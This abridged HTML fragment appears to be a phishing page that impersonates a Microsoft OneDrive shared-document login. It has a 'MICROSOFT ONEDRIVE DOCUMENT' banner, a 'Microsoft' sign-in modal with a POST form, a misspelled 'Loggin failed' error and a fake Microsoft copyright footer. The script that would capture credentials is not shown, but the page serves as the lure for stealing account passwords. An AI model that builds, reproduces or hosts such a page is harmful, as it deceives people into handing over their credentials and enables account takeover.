...
<header class="site-header navbar-transparent">
  ...
  <div class="banner auto-size" style="background-color: #949494">
    <div class="container-fluid text-white">
      <h3>MICROSOFT ONEDRIVE DOCUMENT</h3>
    </div>
  </div>
    ...
    <div class="modal-dialog">
      <div class="modal-content login-modal">
        <div class="modal-header login-modal-header">
          ...
          <h4 class="modal-title text-center" id="loginModalLabel">Microsoft</h4>
        </div>
              ...
              <div class="tab-content">
                <div role="tabpanel" class="tab-pane active text-center" id="home"> &nbsp;&nbsp; <span id="login_fail" class="response_error" style="display: none;">Loggin failed, please try again.</span>
                  ...
                  <form method="post" id="login_form">
                    ...
                    <button type="submit" id="login_btn" class="btn btn-block bt-login" data-loading-text="Signing In....">Sign in</button>
                    <div class="clearfix"></div>
                    <div class="login-modal-footer">
                      <div class="row">
                        <p class="text-center">Sign in with your account to access the document</p>
                      </div>
                    </div>
                  </form>
                </div>
  ...
  <div class="container-fluid"> <a id="scroll-up" href="#"><i class="fa fa-angle-up"></i></a>
    <div class="row">
      <div class="col-md-12 col-sm-12">
        <p class="text-center">&copy; Microsoft  2024 All Copyright Reserved.</p>
      </div>
    </div>
  </div>
</footer>
